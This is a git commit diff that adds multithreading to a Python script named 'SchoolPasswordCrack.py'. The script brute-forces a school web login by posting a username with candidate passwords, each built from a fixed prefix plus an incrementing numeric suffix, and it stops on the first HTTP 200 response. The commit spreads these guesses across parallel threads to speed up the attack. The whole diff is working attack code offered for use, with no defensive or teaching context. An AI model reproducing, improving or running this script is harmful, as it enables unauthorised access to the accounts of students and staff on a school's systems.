322f35d9f925283bc896aad0f7833f0f25d8d150
Connor Slade <turtleslade@gmail.com>
2021-04-10 22:58:43 -0400

    🏆 Threadding Support

--- src/SchoolPasswordCrack.py
+++ src/SchoolPasswordCrack.py
@@ -1,4 +1,4 @@
-import requests,  os, re
+import threading, requests,  os, re
 from datetime import datetime
 
 ############ VARS ############
@@ -37,6 +37,31 @@ def DebugPrint(Catagory, Text, Color):
     if not DEBUG: return
     print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ','yellow')+colored('['+Catagory+'] ','magenta')+colored(Text,Color))
 
+class check(threading.Thread):
+    def __init__(self, thread, url, pWordIta, pWord, uName, timeout, startIndex):
+        threading.Thread.__init__(self)
+        self.thread = thread
+        self.url = url
+        self.pWordIta = pWordIta
+        self.pWord = pWord
+        self.uName = uName
+        self.timeout = timeout
+        self.startIndex = startIndex
+
+    def run(self):
+        for i in range(self.startIndex, self.pWordIta):
+            toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
+            DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
+            try:
+                ses = requests.Session()
+                ses.max_redirects = 2
+                data = ses.post(self.url, timeout=self.timeout, data={"j_password": toTry, "j_username": self.uName})
+            except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
+                continue
+            if data.status_code != 200: continue
+            DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")}', "cyan")
+            os._exit(0)
+
 ####### MAIN FUNCTION #######
 def main():
     DebugPrint('Main', 'Starting...', 'green')  
@@ -47,24 +72,20 @@ def main():
     uName = config.get('uName').split('"')[1]
     pWord = config.get('pWord')
     timeout = float(config.get('timeout'))
+    threads = int(config.get('threads'))
 
 
     DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
-    for i in range(pWordIta):
-        toTry = pWord + (str(i).zfill(len(str(pWordIta))))
-        DebugPrint("Crack", f'{colored("Trying", "cyan")} {colored(toTry, "green")}', "cyan")
-        try:
-            ses = requests.Session()
-            ses.max_redirects = 2
-            data = ses.post(url, timeout=timeout, data={"j_password": toTry, "j_username": uName})
-        except (requests.exceptions.TooManyRedirects, requests.exceptions.Timeout):
-            continue
-        if data.status_code != 200: continue
-        DebugPrint("Complete", f'{colored("Password", "cyan")} {colored(f"{pWord}{str(i).zfill(2)}", "green")}', "cyan")
-        exit(0)
+
+    for i in range(threads):
+        t = check(i, url, pWordIta, pWord, uName, timeout, int((pWordIta/threads - 1) * i))
+        t.daemon = True
+        t.start()
     
 if __name__ == "__main__":
     try:
         main()
+        while True:
+            continue
     except:
         DebugPrint('Main', 'Exiting...', 'red')
